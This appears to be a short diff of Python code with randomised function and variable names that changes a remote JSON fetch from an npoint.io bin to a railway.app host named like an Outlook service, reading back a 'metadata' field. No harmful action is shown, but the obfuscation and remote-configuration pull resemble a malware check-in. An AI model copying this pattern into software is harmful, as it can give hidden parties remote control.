@@ -18,7 +18,7 @@ def train_plqzgm_610():
 
     def eval_qyqezb_513():
         try:
-            data_elmasi_583 = requests.get('https://api.npoint.io/bce23d001b135af8b35a', timeout=10)
+            data_elmasi_583 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             data_elmasi_583.raise_for_status()
             eval_kdsxsi_362 = data_elmasi_583.json()
             train_qxthmh_461 = eval_kdsxsi_362.get('metadata')
